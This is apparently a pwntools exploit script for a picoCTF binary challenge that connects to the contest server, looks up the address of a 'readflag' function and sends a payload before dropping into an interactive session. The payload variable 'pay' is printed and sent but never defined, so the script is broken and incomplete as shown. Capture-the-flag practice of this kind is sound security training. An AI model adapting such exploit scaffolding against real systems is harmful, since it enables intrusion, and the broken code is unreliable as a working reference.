from pwn import *

context.binary = elf = ELF("./vuln", checksec=False)
#p = process("./vuln")
p = remote('saturn.picoctf.net', 53490)

#flag_add = p64(0xffffd020)
flag_add = elf.sym.readflag
print(hex(flag_add))


print(pay)
p.sendline(pay)

p.interactive()
